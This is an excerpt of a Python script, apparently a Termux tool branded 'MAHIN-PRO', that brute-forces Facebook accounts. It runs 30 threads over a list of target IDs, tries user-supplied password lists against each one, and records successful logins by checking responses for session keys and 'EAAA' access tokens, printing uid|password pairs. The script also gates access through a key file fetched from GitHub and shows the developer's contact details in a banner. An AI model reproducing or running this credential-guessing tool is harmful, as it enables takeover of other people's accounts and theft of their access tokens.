...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/arafatmahin310"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/arafatmahin310")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Arafat Bin Mahin")
	subprocess.check_output(["am", "start", "https://www.facebook.com/arafatmahin310"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/arafat-mahin310/bro.txt.git').text
			if basesplit in plr:
				key = basesplit
		...
		print 
______  _______________  _____________   __     ________________       
___   |/  /__    |__  / / /___  _/__  | / /     ___  __ \__  __ \_____ 
__  /|_/ /__  /| |_  /_/ / __  / __   |/ /________  /_/ /_  /_/ /  __ \
_  /  / / _  ___ |  __  / __/ /  _  /|  /_/_____/  ____/_  _, _// /_/ /
/_/  /_/  /_/  |_/_/ /_/  /___/  /_/ |_/        /_/     /_/ |_| \____/ 
                                                                       

     \033[1;92m➣ \033[1;92mDEVOLPER   :            Arafat Mahin
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Arafat Mahin
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01925798757
     \033[1;96m➣ \033[1;92mGITHUB     :            arafatmahin310
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHIN  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:MAHIN ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [MAHIN] : \033[0;97m %s/%s -> \033[0;92m [MAHIN -OK:%s ]- \033[0;93m[MAHIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[MAHIN-CP] %s|%s\033[0;97m         "%(uid, pw))
